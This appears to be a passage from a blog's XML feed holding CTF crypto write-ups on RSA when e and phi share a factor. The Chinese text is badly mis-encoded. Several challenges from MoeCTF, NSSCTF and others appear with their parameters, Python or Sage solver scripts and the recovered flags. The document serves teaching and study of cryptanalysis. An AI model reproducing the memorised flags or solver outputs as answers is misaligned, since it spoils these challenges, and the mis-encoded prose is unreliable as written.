b&#x27;hgame&#123;EulEr:fUNcTIon;iS.So*IMpORTaNt*In&amp;RsA&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>RSAä¸­eä¸phiä¸äº’ç´ é—®é¢˜</title>
    <url>/posts/81fc4c38/</url>
    <content><![CDATA[<h1 id="RSAä¸­-e-phiä¸äº’ç´ é—®é¢˜"><a href="#RSAä¸­-e-phiä¸äº’ç´ é—®é¢˜" class="headerlink" title="RSAä¸­ e phiä¸äº’ç´ é—®é¢˜"></a>RSAä¸­ e phiä¸äº’ç´ é—®é¢˜</h1><p>  åœ¨ä¸€èˆ¬çš„RSAé¢˜ç›®ä¸­ï¼Œé€šè¿‡å¾—åˆ°phiåæ±‚å‡ºeåœ¨phiåœ¨çš„é€†å…ƒè¿›è€Œç§é’¥dï¼Œ éšåå¯ä»¥è¿›ä¸€æ­¥å¾—åˆ°æ˜æ–‡mã€‚ä½†æ˜¯æ±‚é€†å…ƒéœ€è¦æ»¡è¶³ä¸€ä¸ªå‰æ  gcd(e,phi) == 1 ï¼Œéœ€è¦eä¸phiäº’ç´ ï¼Œå¦‚æœeå’Œphiä¸äº’ç´ åˆ™éœ€è¦å…¶ä»–æ–¹æ³•ã€‚æœ¬æ–‡å°†ç®€å•æ€»ç»“ä¸‹åœ¨RSAä¸­eä¸phiä¸äº’ç´ çš„æƒ…å†µã€‚</p>
<p>ã€å¯†ç å­¦å°ç™½ï¼Œç¼ºå°‘è¾ƒå¤šçš„æ•°å­¦åŸºç¡€ï¼Œæ‰€ä»¥æœ‰äº›åœ°æ–¹çœ‹ä¸æ‡‚åªå¥½å…ˆå¥—è½®å­Orzï¼Œåç»­æ…¢æ…¢è¡¥ï¼Œå¤§ä½¬è«æ€ªã€‘</p>
<h2 id="ç±»å‹ä¸€-eä»…ä¸p-1æˆ–q-1äº’ç´ "><a href="#ç±»å‹ä¸€-eä»…ä¸p-1æˆ–q-1äº’ç´ " class="headerlink" title="ç±»å‹ä¸€  eä»…ä¸p-1æˆ–q-1äº’ç´ "></a>ç±»å‹ä¸€  eä»…ä¸p-1æˆ–q-1äº’ç´ </h2><h3 id="2022MoeCTF-Signin"><a href="#2022MoeCTF-Signin" class="headerlink" title="2022MoeCTF Signin"></a>2022MoeCTF Signin</h3><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q=&#x27;</span>,q)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="comment">#p= 12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line"><span class="comment">#q= 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line"><span class="comment">#c= 68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æ</p>
<p>é¢˜ä¸­phi%e == 0ï¼Œgcd(e,phi)=65535ã€ä¹Ÿå¯ä»¥ä½¿ç”¨AMMç®—æ³•è§£å†³æ­¤é¢˜ï¼Œå…·ä½“è§ä¸‹æ–‡ã€‘</p>
<p>phiä¸p-1äº’ç´  gcd(e,p-1)=1ï¼Œé‚£ä¹ˆå¯ä»¥å°†åŸæœ¬çš„phi è½¬æ¢æˆ p-1è¿›è¡Œæ±‚è§£ã€‚</p>
<p>å¦‚æœ gcd(e,phi)=1ï¼Œæ ¹æ®æ¬§æ‹‰å®šç†åˆ™æœ‰  e^d  â‰¡ 1 mod phi    e^d=1+k<em>phi = 1+k</em>(p-1)(q-1)ï¼›m â‰¡ c^d mod (p*q) </p>
<p>ç°åœ¨ gcd(e,p-1)=1ï¼Œåˆ™æœ‰  e^d  â‰¡ 1 mod (p-1)ï¼›m â‰¡ c^d mod p</p>
<p>é‚£ä¹ˆå¯¹åº”æœ‰  m = pow(c,d,n)ï¼Œä¹Ÿå°±å˜æˆ m = pow(c,d,p) </p>
<h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">p= <span class="number">12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073</span></span><br><span class="line">q= <span class="number">12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379</span></span><br><span class="line">c= <span class="number">68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,phi))</span></span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,p-1))</span></span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,q-1))</span></span><br><span class="line"></span><br><span class="line">phi = p-<span class="number">1</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;Oh~Now_Y0u_Kn0W_HoW_RsA_W0rkS!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="2023MoeCTF-bad-E"><a href="#2023MoeCTF-bad-E" class="headerlink" title="2023MoeCTF bad_E"></a>2023MoeCTF bad_E</h3><p>å’Œ2022çš„ä¸€æ ·çš„é¢˜  å°†æ¨¡ä»phiè½¬æ¢ä¸º pæˆ–qè¿›è¡Œæ±‚è§£</p>
<h4 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p) <span class="comment"># 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span></span><br><span class="line"><span class="built_in">print</span>(q) <span class="comment"># 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,p*q)</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment"># 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span></span><br><span class="line">q = <span class="number">11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span></span><br><span class="line">c = <span class="number">63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,p-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,q-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#  gcd(e,q-1) = 1</span></span><br><span class="line"></span><br><span class="line">phi = q-<span class="number">1</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,q)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;N0w_Y0U_hAve_kN0w_h0w_rsA_w0rks!_f!lP0iYlJf!M3ru&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="é»‘ç›¾æ¯-2020-Factor"><a href="#é»‘ç›¾æ¯-2020-Factor" class="headerlink" title="[é»‘ç›¾æ¯ 2020]Factor"></a>[é»‘ç›¾æ¯ 2020]Factor</h3><h4 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="number">3454083680130687060405946528826790951695785465926614724373</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1347530713288996422676156069761604101177635382955634367208</span></span><br><span class="line">gcd(m, n) = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>yafuåˆ†è§£nå¯ä»¥å¾—åˆ° p q r 3ä¸ªç´ æ•°</p>
<p>gcd(e,p-1)=3 è¾ƒå° å¯å°†phi=p<em>q</em>rè½¬æ¢ä¸º phi=q<em>r è¿›è¡Œæ±‚è§£ï¼Œå¯¹åº”çš„m=pow(c,d,n)ä¹Ÿå°±è½¬å˜ä¸ºpow(c,d,q</em>r)</p>
<h4 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">3454083680130687060405946528826790951695785465926614724373</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1347530713288996422676156069761604101177635382955634367208</span></span><br><span class="line"><span class="comment"># yafu åˆ†è§£n</span></span><br><span class="line">p = <span class="number">17100682436035561357</span></span><br><span class="line">q = <span class="number">17172929050033177661</span></span><br><span class="line">r = <span class="number">11761833764528579549</span></span><br><span class="line"></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(gmpy2.gcd(e,p-1))</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">phi = (q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,q*r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;CMISCCTF&#123;3_RSA&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ç±»å‹äºŒ-gcd-e-phi-è¾ƒå°-irootå¼€æ ¹"><a href="#ç±»å‹äºŒ-gcd-e-phi-è¾ƒå°-irootå¼€æ ¹" class="headerlink" title="ç±»å‹äºŒ  gcd(e,phi)è¾ƒå°  irootå¼€æ ¹"></a>ç±»å‹äºŒ  gcd(e,phi)è¾ƒå°  irootå¼€æ ¹</h2><p>gcd2 = gcd(e,phi) è¾ƒå°    å¯é€šè¿‡irootå¼€æ ¹ e//gcd2 æ¬¡æ ¹</p>
<h4 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span>*<span class="number">2</span></span><br><span class="line">n = p*q </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span></span><br><span class="line"><span class="string">q = 9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span></span><br><span class="line"><span class="string">e = 131074</span></span><br><span class="line"><span class="string">c = 68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>t = gcd(e,phi)=gcd(e,p-1)=gcd(e,p-1)=2 </p>
<p>eâ€˜ = e // t</p>
<p>d = gmpy2.invert(eâ€™,phi)</p>
<p>(m^t)^eâ€™ â‰¡  c (mod n)</p>
<p>m^t â‰¡ c^d (mod n)</p>
<p>ç„¶åå¼€tæ¬¡æ–¹è·Ÿå³å¯æ±‚å‡ºm</p>
<h4 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span></span><br><span class="line">q = <span class="number">9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span></span><br><span class="line">e = <span class="number">131074</span></span><br><span class="line">c = <span class="number">68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,p-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">t = gmpy2.gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">d = gmpy2.invert(e//t, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m_gcd = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(m_gcd,t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m[<span class="number">0</span>]))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;inverse_and_root&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="ç±»å‹ä¸‰-gcd-e-phi-è¾ƒå°-irootå¼€ä¸å‡ºæ ¹-ï¼Œæœ‰é™åŸŸå†…å¼€æ ¹"><a href="#ç±»å‹ä¸‰-gcd-e-phi-è¾ƒå°-irootå¼€ä¸å‡ºæ ¹-ï¼Œæœ‰é™åŸŸå†…å¼€æ ¹" class="headerlink" title="ç±»å‹ä¸‰ gcd(e,phi)è¾ƒå° irootå¼€ä¸å‡ºæ ¹ ï¼Œæœ‰é™åŸŸå†…å¼€æ ¹"></a>ç±»å‹ä¸‰ gcd(e,phi)è¾ƒå° irootå¼€ä¸å‡ºæ ¹ ï¼Œæœ‰é™åŸŸå†…å¼€æ ¹</h2><p>gcd(e,phi)è¾ƒå° ä½†irootå¼€æ ¹è·‘ä¸å‡ºæ¥ ,å¯è€ƒè™‘ç»“åˆCRTæ±‚è§£è¿›è¡Œæœ‰é™åŸŸå†…å¼€æ ¹</p>
<h3 id="é¢˜ç›®1"><a href="#é¢˜ç›®1" class="headerlink" title="é¢˜ç›®1"></a>é¢˜ç›®1</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag)==<span class="number">38</span>)</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">304</span></span><br><span class="line">enc = <span class="built_in">pow</span>(flag,e,p*q)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment">#9794998439882070838464987778400633526071369507639213778760131552998185895297188941828281554258704149333679257014558677504899624597863467726403690826271979</span></span><br><span class="line"><span class="comment">#10684338300287479543408040458978465940026825189952497034380241358187629934633982402116457227553161613428839906159238238486780629366907463456434647021345729</span></span><br><span class="line"><span class="comment">#88310577537712396844221012233266891147970635383301697208951868705047581001657402229066444746440502616020663700100248617117426072580419555633169418185262898647471677640199331807653373089977785816106098591077542771088672088382667974425747852317932746201547664979549641193108900510265622890793400796486146522028</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>gcd(e,q-1)=16  gcd(e,p-1)=2</p>
<p>m 38ä½ï¼Œå¯¹åº”608ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ 304bitï¼Œè€Œ pã€qæ˜¯512bitï¼Œm&lt;pã€m&lt;qã€‚</p>
<p>gcd(e,q-1)=16 ï¼Œ(m^16)^((q-1)/16) â‰¡ c mod q </p>
<p>æ±‚(q-1)/16çš„é€†å…ƒï¼Œc^dâ€™  â‰¡ m^16 mod q </p>
<p>ä½†æ˜¯è¿™é‡Œçš„ m^16ç›´æ¥å¼€ä¸å‡ºæ ¹ï¼Œéœ€è¦ç»“åˆCRTç”¨æœ‰é™åŸŸå†…å¼€æ ¹è§£å†³ã€‚</p>
<p>å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªæ¨¡ç‰ˆï¼Œæ ¹æ®nåˆ†è§£ç´ æ•°çš„ä¸ªæ•° é€‚å½“æ·»åŠ ç¼©å‡å³å¯ã€‚</p>
<h4 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9794998439882070838464987778400633526071369507639213778760131552998185895297188941828281554258704149333679257014558677504899624597863467726403690826271979</span></span><br><span class="line">q = <span class="number">10684338300287479543408040458978465940026825189952497034380241358187629934633982402116457227553161613428839906159238238486780629366907463456434647021345729</span></span><br><span class="line">c = <span class="number">88310577537712396844221012233266891147970635383301697208951868705047581001657402229066444746440502616020663700100248617117426072580419555633169418185262898647471677640199331807653373089977785816106098591077542771088672088382667974425747852317932746201547664979549641193108900510265622890793400796486146522028</span></span><br><span class="line">e = <span class="number">304</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;947b6543117e32730a93d1b43c98bc57&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="unusualrsa5"><a href="#unusualrsa5" class="headerlink" title="unusualrsa5"></a>unusualrsa5</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>t=gcd(e,p-1)=gcd(e,q-1)=20</p>
<p>ç›´æ¥å¥—è„šæœ¬</p>
<h4 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x14</span></span><br><span class="line">p = <span class="number">733089589724903586073820965792963746076789390539824437962807679954808310072656817423828613938510684864567664345751164944269489647964227519307980688068059059377123391499328155025962198363435968318689113750910755244276996554328840879221120846257832190569086861774466785101694608744384540722995426474322431441</span></span><br><span class="line">q = <span class="number">771182695213910447650732428220054698293987458796864628535794956332865106301119308051373568460701145677164052375651484670636989109023957702790185901445649197004100341656188532246838220216919835415376078688888076677350412398198442910825884505318258393640994788407100699355386681624118606588957344077387058721</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">406314720119562590605554101860453913891646775958515375190169046313074168423687276987576196367702523895650602252851191274766072774312855212771035294337840170341052016067631007495713764510925931612800335613551752201920460877432379214684677593342046715833439574705829048358675771542989832566579493199671622475225225451781214904100440695928239014046619329247750637911015313431804069312072581674845078940868349474663382442540424342613429896445329365750444298236684237769335405534090013035238333534521759502103604033307768304224154383880727399879024077733935062478113298538634071453067782212909271392163928445051705642</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m = crt(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;r54__d34l1n6_w17h_3v3n_3 _&amp;_f1nd1n6_n-7h_r0075~~&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="ç±»å‹å››-gcd-e-phi-å¾ˆå¤§-AMM"><a href="#ç±»å‹å››-gcd-e-phi-å¾ˆå¤§-AMM" class="headerlink" title="ç±»å‹å››  gcd(e,phi)å¾ˆå¤§ AMM"></a>ç±»å‹å››  gcd(e,phi)å¾ˆå¤§ AMM</h2><h3 id="AMMç®—æ³•"><a href="#AMMç®—æ³•" class="headerlink" title="AMMç®—æ³•"></a>AMMç®—æ³•</h3><p>AMMç®—æ³•åœ¨RSAä¸­é€‚ç”¨äº  phi % e == 0çš„æƒ…å†µã€e | phi_nã€‘æœ‰é™åŸŸä¸Šçš„é«˜æ¬¡å¼€æ ¹</p>
<p>AMMç®—æ³•ä½œç”¨å°±æ˜¯åœ¨æœ‰é™åŸŸä¸­å¼€å‡ºä¸€ä¸ªæ ¹ã€‚</p>
<p>è¿™å—æš‚æ—¶ä¸æäº†ã€‚ç®—æ³•çœ‹ä¸æ‡‚ ç›´æ¥æ‰¾è½®å­ã€‚ã€‚ã€‚ã€æƒ³å»äº†è§£å¯å‚è€ƒ<a href="https://www.anquanke.com/post/id/262634#h2-5%E3%80%91">https://www.anquanke.com/post/id/262634#h2-5ã€‘</a></p>
